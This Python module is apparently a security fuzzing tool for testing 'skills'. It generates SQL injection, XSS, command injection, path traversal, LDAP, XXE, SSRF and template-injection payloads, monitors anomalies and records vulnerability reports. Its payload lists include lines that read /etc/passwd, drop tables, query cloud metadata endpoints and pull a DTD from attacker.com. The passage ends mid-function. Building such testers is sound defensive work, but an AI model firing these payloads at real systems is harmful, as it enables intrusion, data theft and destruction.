"""
Adversarial Gatekeeper for Kiro-SkillForge Security Testing.

Proactively attempts to break skills through malicious input testing,
monitors for anomalous behavior, and records vulnerability information.

Implements:
- Task 2.9.1: Malicious Input Generator - Generate malicious inputs using known vulnerability patterns
- Task 2.9.2: Exploit Monitor - Monitor skill execution for anomalous behavior
- Task 2.9.3: Vulnerability Recorder - Record exploit paths when vulnerabilities are detected

Validates: Requirements 8.1, 8.2, 8.3, 8.4, 8.5, 8.6
"""

from __future__ import annotations

import json
import logging
import re
import threading
import time
import traceback
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Generator

# Configure module logger
logger = logging.getLogger(__name__)


# ============================================================================
# Vulnerability Types
# ============================================================================

class VulnerabilityType(str, Enum):
    """Types of security vulnerabilities."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    TEMPLATE_INJECTION = "template_injection"
    DESERIALIZATION = "deserialization"
    OPEN_REDIRECT = "open_redirect"
    AUTH_BYPASS = "auth_bypass"
    MEMORY_EXHAUSTION = "memory_exhaustion"
    INFINITE_LOOP = "infinite_loop"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    INFORMATION_DISCLOSURE = "information_disclosure"


class VulnerabilitySeverity(str, Enum):
    """Severity levels for vulnerabilities."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class AnomalyType(str, Enum):
    """Types of anomalous behavior."""
    MEMORY_EXHAUSTION = "memory_exhaustion"
    CPU_SPIKE = "cpu_spike"
    INFINITE_LOOP = "infinite_loop"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    FILE_SYSTEM_ABUSE = "file_system_abuse"
    NETWORK_ABUSE = "network_abuse"
    PROCESS_SPAWN = "process_spawn"
    SENSITIVE_DATA_EXFILTRATION = "sensitive_data_exfiltration"


# ============================================================================
# Malicious Input Generator (Task 2.9.1)
# ============================================================================

@dataclass
class MaliciousInput:
    """A generated malicious input payload."""
    vulnerability_type: VulnerabilityType
    payload: str
    description: str
    severity: VulnerabilitySeverity
    category: str
    context: str = "general"  # Where to inject (url, header, body, etc.)
    encoding: str = "plain"  # Encoding used (plain, url, html, base64)
    expected_effect: str = ""
    detection_pattern: str | None = None


class MaliciousInputGenerator:
    """
    Generates malicious inputs using known vulnerability patterns.

    Supports SQL injection, XSS, command injection, path traversal,
    and other common attack patterns.

    Task 2.9.1: Malicious Input Generator
    Validates: Requirements 8.1

    Example:
        >>> generator = MaliciousInputGenerator()
        >>> for payload in generator.generate_sql_injection():
        ...     print(payload.payload)
    """

    def __init__(
        self,
        *,
        include_obfuscated: bool = True,
        include_polyglot: bool = True,
    ) -> None:
        """
        Initialize the generator.

        Args:
            include_obfuscated: Include obfuscated payload variants
            include_polyglot: Include polyglot payloads
        """
        self.include_obfuscated = include_obfuscated
        self.include_polyglot = include_polyglot

    def generate_all(
        self,
        *,
        categories: list[str] | None = None,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate all malicious inputs.

        Args:
            categories: Filter by vulnerability categories

        Yields:
            MaliciousInput payloads
        """
        yield from self.generate_sql_injection()
        yield from self.generate_xss()
        yield from self.generate_command_injection()
        yield from self.generate_path_traversal()
        yield from self.generate_ldap_injection()
        yield from self.generate_xxe()
        yield from self.generate_ssrf()
        yield from self.generate_template_injection()

    def generate_sql_injection(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate SQL injection payloads.

        Yields:
            SQL injection MaliciousInput payloads
        """
        payloads = [
            ("'", "Basic single quote", "OR '1'='1"),
            ("' OR '1'='1", "Authentication bypass", "OR '1'='1"),
            ("' OR '1'='1' --", "Comment termination", "--"),
            ("' UNION SELECT NULL--", "UNION attack", "UNION"),
            ("' UNION SELECT NULL, NULL--", "Multi-column UNION", "UNION"),
            ("1 OR 1=1", "Always true condition", "OR"),
            ("1; DROP TABLE users--", "Stacked query", "DROP"),
            ("' AND 1=1--", "Boolean-based blind", "AND"),
            ("' WAITFOR DELAY '0:0:5'--", "Time-based blind", "WAITFOR"),
            ("admin'--", "Comment bypass", "--"),
            ("' HAVING 1=1--", "HAVING clause injection", "HAVING"),
            ("' GROUP BY columnnames--", "GROUP BY injection", "GROUP BY"),
            ("' ORDER BY 1--", "ORDER BY injection", "ORDER BY"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="sql_injection",
                context="input",
                expected_effect="Database query manipulation",
                detection_pattern=detection,
            )

        # Obfuscated variants
        if self.include_obfuscated:
            obfuscated = [
                ("'/**/OR/**/'1'='1", "Comment obfuscation", "OR"),
                ("'%20OR%20'1'='1", "URL encoded", "OR"),
                ("' %55NION %53ELECT", "Keyword encoding", "UNION"),
                ("' UnIoN SeLeCt", "Case variation", "UNION"),
            ]

            for payload, description, detection in obfuscated:
                yield MaliciousInput(
                    vulnerability_type=VulnerabilityType.SQL_INJECTION,
                    payload=payload,
                    description=description,
                    severity=VulnerabilitySeverity.HIGH,
                    category="sql_injection_obfuscated",
                    context="input",
                    expected_effect="Database query manipulation (obfuscated)",
                    detection_pattern=detection,
                )

    def generate_xss(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate XSS payloads.

        Yields:
            XSS MaliciousInput payloads
        """
        payloads = [
            ("<script>alert('XSS')</script>", "Basic script tag", "script"),
            ("<img src=x onerror=alert('XSS')>", "Image error handler", "onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload", "onload"),
            ("<body onload=alert('XSS')>", "Body onload", "onload"),
            ("'><script>alert('XSS')</script>", "Attribute breakout", "script"),
            ("\"><script>alert('XSS')</script>", "Double quote breakout", "script"),
            ("javascript:alert('XSS')", "JavaScript protocol", "javascript:"),
            ("<a href=\"javascript:alert('XSS')\">", "Link injection", "javascript:"),
            ("<iframe src=\"javascript:alert('XSS')\">", "Iframe injection", "iframe"),
            ("<object data=\"javascript:alert('XSS')\">", "Object injection", "object"),
            ("<embed src=\"javascript:alert('XSS')\">", "Embed injection", "embed"),
            ("<input onfocus=alert('XSS') autofocus>", "Input autofocus", "onfocus"),
            ("<marquee onstart=alert('XSS')>", "Marquee onstart", "onstart"),
            ("<details open ontoggle=alert('XSS')>", "Details toggle", "ontoggle"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.XSS,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="xss",
                context="input",
                expected_effect="JavaScript execution",
                detection_pattern=detection,
            )

        # Obfuscated XSS
        if self.include_obfuscated:
            obfuscated = [
                ("<ScRiPt>alert('XSS')</sCrIpT>", "Case variation", "script"),
                ("<script/src=x>", "Self-closing tag", "script"),
                ("<img/src=x/onerror=alert('XSS')>", "No spaces", "onerror"),
                ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL encoded", "script"),
                ("&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "HTML entities", "script"),
            ]

            for payload, description, detection in obfuscated:
                yield MaliciousInput(
                    vulnerability_type=VulnerabilityType.XSS,
                    payload=payload,
                    description=description,
                    severity=VulnerabilitySeverity.HIGH,
                    category="xss_obfuscated",
                    context="input",
                    expected_effect="JavaScript execution (obfuscated)",
                    detection_pattern=detection,
                )

    def generate_command_injection(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate command injection payloads.

        Yields:
            Command injection MaliciousInput payloads
        """
        payloads = [
            ("; ls -la", "Semicolon separator", ";"),
            ("| cat /etc/passwd", "Pipe separator", "|"),
            ("`id`", "Backtick execution", "`"),
            ("$(whoami)", "Dollar substitution", "$("),
            ("&& cat /etc/passwd", "AND operator", "&&"),
            ("|| cat /etc/passwd", "OR operator", "||"),
            ("\nwhoami", "Newline separator", "\n"),
            ("; cat /etc/passwd #", "Comment injection", "#"),
            ("1; sleep 10", "Time-based detection", "sleep"),
            ("a]'; touch /tmp/pwned; echo '", "Touch file creation", "touch"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.CRITICAL,
                category="command_injection",
                context="input",
                expected_effect="OS command execution",
                detection_pattern=detection,
            )

    def generate_path_traversal(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate path traversal payloads.

        Yields:
            Path traversal MaliciousInput payloads
        """
        payloads = [
            ("../../../etc/passwd", "Basic traversal", "../"),
            ("....//....//....//etc/passwd", "Filter bypass", "../"),
            ("..%2F..%2F..%2Fetc/passwd", "URL encoded", "%2F"),
            ("..%252f..%252f..%252fetc/passwd", "Double encoded", "%252f"),
            ("..\\..\\..\\windows\\system32\\config\\sam", "Windows path", "..\\"),
            ("..%5c..%5c..%5cwindows\\system32\\config\\sam", "Windows encoded", "%5c"),
            ("/etc/passwd%00", "Null byte", "%00"),
            ("....//....//....//etc/passwd", "Bypass filter", "../"),
            ("..;/..;/..;/etc/passwd", "Semicolon bypass", "..;/"),
            ("/var/www/../../etc/passwd", "Absolute path", "/var/"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="path_traversal",
                context="filepath",
                expected_effect="Arbitrary file read",
                detection_pattern=detection,
            )

    def generate_ldap_injection(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate LDAP injection payloads.

        Yields:
            LDAP injection MaliciousInput payloads
        """
        payloads = [
            ("*", "Wildcard", "*"),
            ("*)(uid=*", "Filter injection", "uid="),
            ("*)(|(uid=*", "OR injection", "uid="),
            ("*)(objectClass=*", "Object class", "objectClass"),
            (")(&(uid=*))", "AND injection", "uid="),
            ("admin)(|(password=*))", "Password disclosure", "password"),
            ("*)(cn=*))(|(cn=*", "CN injection", "cn="),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.LDAP_INJECTION,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="ldap_injection",
                context="input",
                expected_effect="LDAP query manipulation",
                detection_pattern=detection,
            )

    def generate_xxe(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate XXE payloads.

        Yields:
            XXE MaliciousInput payloads
        """
        payloads = [
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Basic XXE", "DOCTYPE"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>', "Windows XXE", "DOCTYPE"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>', "External DTD", "DTD"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.XXE,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.CRITICAL,
                category="xxe",
                context="xml",
                expected_effect="XML External Entity processing",
                detection_pattern=detection,
            )

    def generate_ssrf(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate SSRF payloads.

        Yields:
            SSRF MaliciousInput payloads
        """
        payloads = [
            ("http://localhost/admin", "Localhost SSRF", "localhost"),
            ("http://127.0.0.1/admin", "IP SSRF", "127.0.0.1"),
            ("http://[::1]/admin", "IPv6 localhost", "::1"),
            ("http://0.0.0.0/admin", "Zero IP", "0.0.0.0"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata", "169.254"),
            ("http://metadata.google.internal/", "GCP metadata", "metadata.google"),
            ("http://169.254.169.254/metadata/v1/", "Azure metadata", "metadata"),
            ("file:///etc/passwd", "File protocol", "file:"),
            ("gopher://localhost:70/", "Gopher protocol", "gopher:"),
            ("dict://localhost:11211/stat", "Dict protocol", "dict:"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.SSRF,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="ssrf",
                context="url",
                expected_effect="Server-side request forgery",
                detection_pattern=detection,
            )

    def generate_template_injection(
        self,
    ) -> Generator[MaliciousInput, None, None]:
        """
        Generate template injection payloads.

        Yields:
            Template injection MaliciousInput payloads
        """
        payloads = [
            ("{{7*7}}", "Jinja2 basic", "{{"),
            ("${7*7}", "EL expression", "${"),
            ("#{7*7}", "Ruby ERB", "#{"),
            ("<%= 7*7 %>", "ERB tags", "<%="),
            ("{{constructor.constructor('return this')()}}", "JS prototype", "constructor"),
            ("${{7*7}}", "Thymeleaf", "${{"),
            ("{{config.items()}}", "Flask config", "config"),
            ("${T(java.lang.Runtime).getRuntime()}", "Spring EL", "Runtime"),
        ]

        for payload, description, detection in payloads:
            yield MaliciousInput(
                vulnerability_type=VulnerabilityType.TEMPLATE_INJECTION,
                payload=payload,
                description=description,
                severity=VulnerabilitySeverity.HIGH,
                category="template_injection",
                context="input",
                expected_effect="Server-side template injection",
                detection_pattern=detection,
            )


# ============================================================================
# Exploit Monitor (Task 2.9.2)
# ============================================================================

@dataclass
class Anomaly:
    """A detected anomaly during execution."""
    anomaly_type: AnomalyType
    severity: VulnerabilitySeverity
    description: str
    detected_at: str
    details: dict[str, Any] = field(default_factory=dict)
    remediation: str | None = None


@dataclass
class MonitoringConfig:
    """Configuration for execution monitoring."""
    memory_limit_mb: float = 512.0
    cpu_limit_percent: float = 80.0
    execution_timeout_seconds: float = 30.0
    max_file_operations: int = 100
    max_network_requests: int = 50
    max_process_spawns: int = 0
    check_interval_ms: float = 100.0


class ExploitMonitor:
    """
    Monitors skill execution for anomalous behavior.

    Detects memory exhaustion, infinite loops, unauthorized access,
    and other suspicious activities during malicious input testing.

    Task 2.9.2: Exploit Monitor
    Validates: Requirements 8.3

    Example:
        >>> monitor = ExploitMonitor()
        >>> monitor.start_monitoring()
        >>> # ... execute skill ...
        >>> anomalies = monitor.stop_monitoring()
        >>> len(anomalies)
        0
    """

    def __init__(
        self,
        config: MonitoringConfig | None = None,
    ) -> None:
        """
        Initialize the exploit monitor.

        Args:
            config: Monitoring configuration
        """
        self.config = config or MonitoringConfig()
        self._start_time: float | None = None
        self._anomalies: list[Anomaly] = []
        self._monitoring = False
        self._lock = threading.Lock()

    def start_monitoring(self) -> None:
        """Start monitoring execution."""
        self._start_time = time.time()
        self._anomalies = []
        self._monitoring = True
        logger.debug("Started exploit monitoring")

    def stop_monitoring(self) -> list[Anomaly]:
        """
        Stop monitoring and return detected anomalies.

        Returns:
            List of anomalies detected during monitoring
        """
        self._monitoring = False

        # Check for timeout
        if self._start_time:
            elapsed = time.time() - self._start_time
            if elapsed > self.config.execution_timeout_seconds:
                anomaly = Anomaly(
                    anomaly_type=AnomalyType.INFINITE_LOOP,
                    severity=VulnerabilitySeverity.HIGH,
                    description=f"Execution exceeded timeout ({elapsed:.2f}s)",
                    detected_at=datetime.utcnow().isoformat(),
                    details={"elapsed_seconds": elapsed, "timeout_seconds": self.config.execution_timeout_seconds},
                    remediation="Increase timeout or optimize execution",
                )
                self._add_anomaly(anomaly)

        logger.debug(f"Stopped monitoring, {len(self._anomalies)} anomalies detected")
        return self._anomalies.copy()

    def check_memory_usage(
        self,
        current_mb: float,
    ) -> Anomaly | None:
        """
        Check if memory usage exceeds limits.

        Args:
            current_mb: Current memory usage in MB

        Returns:
            Anomaly if limit exceeded, None otherwise
        """
        if current_mb > self.config.memory_limit_mb:
            anomaly = Anomaly(
                anomaly_type=AnomalyType.MEMORY_EXHAUSTION,
                severity=VulnerabilitySeverity.HIGH,
                description=f"Memory usage ({current_mb:.2f}MB) exceeds limit ({self.config.memory_limit_mb}MB)",
                detected_at=datetime.utcnow().isoformat(),
                details={"current_mb": current_mb, "limit_mb": self.config.memory_limit_mb},
                remediation="Review memory allocation patterns or increase limit",
            )
            self._add_anomaly(anomaly)
            return anomaly
        return None

    def check_cpu_usage(
        self,
        current_percent: float,
    ) -> Anomaly | None:
        """
        Check if CPU usage exceeds limits.

        Args:
            current_percent: Current CPU usage percentage

        Returns:
            Anomaly if limit exceeded, None otherwise
        """
        if current_percent > self.config.cpu_limit_percent:
            anomaly = Anomaly(
                anomaly_type=AnomalyType.CPU_SPIKE,
                severity=VulnerabilitySeverity.MEDIUM,
                description=f"CPU usage ({current_percent:.2f}%) exceeds limit ({self.config.cpu_limit_percent}%)",
                detected_at=datetime.utcnow().isoformat(),
                details={"current_percent": current_percent, "limit_percent": self.config.cpu_limit_percent},
                remediation="Review CPU-intensive operations",
            )
            self._add_anomaly(anomaly)
            return anomaly
        return None

    def check_file_operations(
        self,
        operation_count: int,
    ) -> Anomaly | None:
        """
        Check if file operation count exceeds limits.

        Args:
            operation_count: Number of file operations

        Returns:
            Anomaly if limit exceeded, None otherwise
        """
        if operation_count > self.config.max_file_operations:
            anomaly = Anomaly(
                anomaly_type=AnomalyType.FILE_SYSTEM_ABUSE,
                severity=VulnerabilitySeverity.HIGH,
                description=f"File operations ({operation_count}) exceeds limit ({self.config.max_file_operations})",
                detected_at=datetime.utcnow().isoformat(),
                details={"operation_count": operation_count, "limit": self.config.max_file_operations},
                remediation="Review file access patterns",
            )
            self._add_anomaly(anomaly)
            return anomaly
        return None

    def check_network_requests(
        self,
        request_count: int,
    ) -> Anomaly | None:
        """
        Check if network request count exceeds limits.

        Args:
            request_count: Number of network requests

        Returns:
            Anomaly if limit exceeded, None otherwise
        """
        if request_count > self.config.max_network_requests:
            anomaly = Anomaly(
                anomaly_type=AnomalyType.NETWORK_ABUSE,
                severity=VulnerabilitySeverity.HIGH,
                description=f"Network requests ({request_count}) exceeds limit ({self.config.max_network_requests})",
                detected_at=datetime.utcnow().isoformat(),
                details={"request_count": request_count, "limit": self.config.max_network_requests},
                remediation="Review network request patterns",
            )
            self._add_anomaly(anomaly)
            return anomaly
        return None

    def check_process_spawn(
        self,
        spawn_count: int,
    ) -> Anomaly | None:
        """
        Check if process spawn count exceeds limits.

        Args:
            spawn_count: Number of processes spawned

        Returns:
            Anomaly if limit exceeded, None otherwise
        """
        if spawn_count > self.config.max_process_spawns:
            anomaly = Anomaly(
                anomaly_type=AnomalyType.PROCESS_SPAWN,
                severity=VulnerabilitySeverity.CRITICAL,
                description=f"Process spawns ({spawn_count}) exceeds limit ({self.config.max_process_spawns})",
                detected_at=datetime.utcnow().isoformat(),
                details={"spawn_count": spawn_count, "limit": self.config.max_process_spawns},
                remediation="Review process spawning logic",
            )
            self._add_anomaly(anomaly)
            return anomaly
        return None

    def detect_unauthorized_access(
        self,
        resource: str,
        action: str,
    ) -> Anomaly:
        """
        Record unauthorized access attempt.

        Args:
            resource: Resource accessed
            action: Action attempted

        Returns:
            Anomaly describing the access attempt
        """
        anomaly = Anomaly(
            anomaly_type=AnomalyType.UNAUTHORIZED_ACCESS,
            severity=VulnerabilitySeverity.HIGH,
            description=f"Unauthorized access attempt to '{resource}' for action '{action}'",
            detected_at=datetime.utcnow().isoformat(),
            details={"resource": resource, "action": action},
            remediation="Review access control implementation",
        )
        self._add_anomaly(anomaly)
        return anomaly

    def detect_sensitive_data_exfiltration(
        self,
        data_type: str,
        destination: str,
    ) -> Anomaly:
        """
        Record sensitive data exfiltration attempt.

        Args:
            data_type: Type of data being exfiltrated
            destination: Destination of data

        Returns:
            Anomaly describing the exfiltration attempt
        """
        anomaly = Anomaly(
            anomaly_type=AnomalyType.SENSITIVE_DATA_EXFILTRATION,
            severity=VulnerabilitySeverity.CRITICAL,
            description=f"Sensitive data ({data_type}) exfiltration to '{destination}'",
            detected_at=datetime.utcnow().isoformat(),
            details={"data_type": data_type, "destination": destination},
            remediation="Review data handling and output sanitization",
        )
        self._add_anomaly(anomaly)
        return anomaly

    def _add_anomaly(self, anomaly: Anomaly) -> None:
        """Add an anomaly to the list."""
        with self._lock:
            self._anomalies.append(anomaly)

        if anomaly.severity in (VulnerabilitySeverity.CRITICAL, VulnerabilitySeverity.HIGH):
            logger.warning(f"Anomaly detected: {anomaly.description}")
        else:
            logger.info(f"Anomaly detected: {anomaly.description}")


# ============================================================================
# Vulnerability Recorder (Task 2.9.3)
# ============================================================================

@dataclass
class ExploitPath:
    """Path of an exploit from input to vulnerability."""
    step_number: int
    action: str
    input_value: str
    output_value: str | None
    intermediate_state: dict[str, Any] = field(default_factory=dict)


@dataclass
class VulnerabilityReport:
    """Detailed report of a detected vulnerability."""
    vulnerability_id: str
    vulnerability_type: VulnerabilityType
    severity: VulnerabilitySeverity
    description: str
    detected_at: str
    skill_name: str
    exploit_path: list[ExploitPath] = field(default_factory=list)
    malicious_input: MaliciousInput | None = None
    anomaly: Anomaly | None = None
    stack_trace: str | None = None
    impact: str = ""
    remediation: str = ""
    references: list[str] = field(default_factory=list)
    cvss_score: float | None = None
    cwe_id: str | None = None

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary format."""
        return {
            "vulnerabilityId": self.vulnerability_id,
            "vulnerabilityType": self.vulnerability_type.value,
            "severity": self.severity.value,
            "description": self.description,
            "detectedAt": self.detected_at,
            "skillName": self.skill_name,
            "exploitPath": [
                {
                    "stepNumber": step.step_number,
                    "action": step.action,
                    "inputValue": step.input_value,
                    "outputValue": step.output_value,
                    "intermediateState": step.intermediate_state,
                }
                for step in self.exploit_path
            ],
            "maliciousInput": {
                "vulnerabilityType": self.malicious_input.vulnerability_type.value,
                "payload": self.malicious_input.payload,
                "description": self.malicious_input.description,
                "category": self.malicious_input.category,
            } if self.malicious_input else None,
            "anomaly": {
                "anomalyType": self.anomaly.anomaly_type.value,
                "description": self.anomaly.description,
            } if self.anomaly else None,
            "stackTrace": self.stack_trace,
            "impact": self.impact,
            "remediation": self.remediation,
            "references": self.references,
            "cvssScore": self.cvss_score,
            "cweId": self.cwe_id,
        }


class VulnerabilityRecorder:
    """
    Records exploit paths when vulnerabilities are detected.

    Generates detailed vulnerability reports with exploit paths,
    impact analysis, and remediation suggestions.

    Task 2.9.3: Vulnerability Recorder
    Validates: Requirements 8.4

    Example:
        >>> recorder = VulnerabilityRecorder()
        >>> recorder.record_vulnerability(
        ...     skill_name="my-skill",
        ...     vuln_type=VulnerabilityType.SQL_INJECTION,
        ...     malicious_input=payload,
        ... )
        >>> report = recorder.get_reports()[0]
    """

    # CWE mappings for vulnerability types
    CWE_MAPPINGS: dict[VulnerabilityType, str] = {
        VulnerabilityType.SQL_INJECTION: "CWE-89",
        VulnerabilityType.XSS: "CWE-79",
        VulnerabilityType.COMMAND_INJECTION: "CWE-78",
        VulnerabilityType.PATH_TRAVERSAL: "CWE-22",
        VulnerabilityType.LDAP_INJECTION: "CWE-90",
        VulnerabilityType.XXE: "CWE-611",
        VulnerabilityType.SSRF: "CWE-918",
        VulnerabilityType.TEMPLATE_INJECTION: "CWE-94",
        VulnerabilityType.DESERIALIZATION: "CWE-502",
        VulnerabilityType.OPEN_REDIRECT: "CWE-601",
        VulnerabilityType.AUTH_BYPASS: "CWE-287",
        VulnerabilityType.MEMORY_EXHAUSTION: "CWE-770",
        VulnerabilityType.INFINITE_LOOP: "CWE-835",
        VulnerabilityType.UNAUTHORIZED_ACCESS: "CWE-862",
        VulnerabilityType.INFORMATION_DISCLOSURE: "CWE-200",
    }

    def __init__(
        self,
        *,
        output_path: Path | None = None,
        max_reports: int = 10000,
    ) -> None:
        """
        Initialize the vulnerability recorder.

        Args:
            output_path: Optional path to persist reports
            max_reports: Maximum reports to keep in memory
        """
        self.output_path = output_path
        self.max_reports = max_reports
        self._reports: list[VulnerabilityReport] = []
        self._report_counter = 0

    def record_vulnerability(
        self,
        skill_name: str,
        vuln_type: VulnerabilityType,
        *,
        description: str | None = None,
        severity: VulnerabilitySeverity | None = None,
        malicious_input: MaliciousInput | None = None,
        anomaly: Anomaly | None = None,
        exploit_path: list[ExploitPath] | None = None,
        stack_trace: str | None = None,
    ) -> VulnerabilityReport:
        """
        Record a detected vulnerability.

        Args:
            skill_name: Name of the skill where vulnerability was found
            vuln_type: Type of vulnerability
            description: Optional description
            severity: Optional severity (derived from type if not provided)
            malicious_input: The malicious input that triggered the vulnerability
            anomaly: Associated anomaly if any
            exploit_path: Path of the exploit
            stack_trace: Stack trace if available

        Returns:
            VulnerabilityReport for the recorded vulnerability
        """
        self._report_counter += 1
        vuln_id = f"VULN-{self._report_counter:06d}"

        # Derive severity if not provided
        if severity is None:
            severity = self._derive_severity(vuln_type)

        # Get CWE ID
        cwe_id = self.CWE_MAPPINGS.get(vuln_type)

        # Generate description if not provided
        if description is None:
            description = f"{vuln_type.value.replace('_', ' ').title()} vulnerability detected in {skill_name}"

        # Generate impact and remediation
        impact = self._generate_impact(vuln_type)
        remediation = self._generate_remediation(vuln_type)
        references = self._generate_references(vuln_type)

        report = VulnerabilityReport(
            vulnerability_id=vuln_id,
            vulnerability_type=vuln_type,
            severity=severity,
            description=description,
            detected_at=datetime.utcnow().isoformat(),
            skill_name=skill_name,
            exploit_path=exploit_path or [],
            malicious_input=malicious_input,
            anomaly=anomaly,
            stack_trace=stack_trace,
            impact=impact,
            remediation=remediation,
            references=references,
            cwe_id=cwe_id,
        )

        self._reports.append(report)
        self._enforce_limit()

        # Persist if path configured
        if self.output_path:
            self._persist_report(report)

        logger.warning(f"Vulnerability recorded: {vuln_id} ({vuln_type.value}) in {skill_name}")
        return report

    def get_reports(
        self,
        *,
        skill_name: str | None = None,
        severity: VulnerabilitySeverity | None = None,
        vuln_type: VulnerabilityType | None = None,
        limit: int = 100,
    ) -> list[VulnerabilityReport]:
        """
        Get recorded vulnerability reports.

        Args:
            skill_name: Filter by skill name
            severity: Filter by severity
            vuln_type: Filter by vulnerability type
            limit: Maximum results to return

        Returns:
            List of matching vulnerability reports
        """
        reports = self._reports

        if skill_name:
            reports = [r for r in reports if r.skill_name == skill_name]
        if severity:
            reports = [r for r in reports if r.severity == severity]
        if vuln_type:
            reports = [r for r in reports if r.vulnerability_type == vuln_type]

        return reports[-limit:]

    def get_critical_vulnerabilities(self) -> list[VulnerabilityReport]:
        """Get all critical severity vulnerabilities."""
        return [
            r for r in self._reports
            if r.severity == VulnerabilitySeverity.CRITICAL
        ]

    def get_report_summary(self) -> dict[str, Any]:
        """
        Get summary of all recorded vulnerabilities.

        Returns:
            Summary dictionary with counts by type and severity
        """
        by_type: dict[str, int] = {}
        by_severity: dict[str, int] = {}
        by_skill: dict[str, int] = {}

        for report in self._reports:
            vuln_type = report.vulnerability_type.value
            severity = report.severity.value
            skill = report.skill_name

            by_type[vuln_type] = by_type.get(vuln_type, 0) + 1
            by_severity[severity] = by_severity.get(severity, 0) + 1
            by_skill[skill] = by_skill.get(skill, 0) + 1

        return {
            "total_vulnerabilities": len(self._reports),
            "by_type": by_type,
            "by_severity": by_severity,
            "by_skill": by_skill,
            "critical_count": len(self.get_critical_vulnerabilities()),
        }

    def clear_reports(self) -> int:
        """Clear all recorded reports. Returns count cleared."""
        count = len(self._reports)
        self._reports.clear()
        return count

    def export_reports(self, path: Path | None = None) -> bool:
        """
        Export all reports to a JSON file.

        Args:
            path: Optional path override

        Returns:
            True if export succeeded
        """
        target_path = path or self.output_path
        if not target_path:
            return False

        try:
            target_path.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "exported_at": datetime.utcnow().isoformat(),
                "total_reports": len(self._reports),
                "reports": [r.to_dict() for r in self._reports],
            }
            target_path.write_text(json.dumps(data, indent=2))
            logger.info(f"Exported {len(self._reports)} vulnerability reports to {target_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to export reports: {e}")
            return False

    def _derive_severity(self, vuln_type: VulnerabilityType) -> VulnerabilitySeverity:
        """Derive severity from vulnerability type."""
        critical_types = {
            VulnerabilityType.COMMAND_INJECTION,
            VulnerabilityType.XXE,
            VulnerabilityType.DESERIALIZATION,
            VulnerabilityType.SSRF,
        }

        high_types = {
            VulnerabilityType.SQL_INJECTION,
            VulnerabilityType.XSS,
            VulnerabilityType.PATH_TRAVERSAL,
            VulnerabilityType.LDAP_INJECTION,
            VulnerabilityType.TEMPLATE_INJECTION,
            VulnerabilityType.AUTH_BYPASS,
            VulnerabilityType.MEMORY_EXHAUSTION,
            VulnerabilityType.INFINITE_LOOP,
            VulnerabilityType.UNAUTHORIZED_ACCESS,
        }

        if vuln_type in critical_types:
            return VulnerabilitySeverity.CRITICAL
        elif vuln_type in high_types:
            return VulnerabilitySeverity.HIGH
        elif vuln_type in {VulnerabilityType.OPEN_REDIRECT, VulnerabilityType.INFORMATION_DISCLOSURE}:
            return VulnerabilitySeverity.MEDIUM
        else:
            return VulnerabilitySeverity.LOW

    def _generate_impact(self, vuln_type: VulnerabilityType) -> str:
        """Generate impact description."""
        impacts: dict[VulnerabilityType, str] = {
            VulnerabilityType.SQL_INJECTION: "Database data theft, modification, or deletion. Potential for complete database compromise.",
            VulnerabilityType.XSS: "Session hijacking, credential theft, malware distribution, or website defacement.",
            VulnerabilityType.COMMAND_INJECTION: "Complete system compromise with potential for lateral movement.",
            VulnerabilityType.PATH_TRAVERSAL: "Access to sensitive files including credentials, configuration, and source code.",
            VulnerabilityType.XXE: "File disclosure, Server-Side Request Forgery, or denial of service.",
            VulnerabilityType.SSRF: "Access to internal services, cloud metadata endpoints, or sensitive data exfiltration.",
            VulnerabilityType.TEMPLATE_INJECTION: "Remote code execution with full system access.",
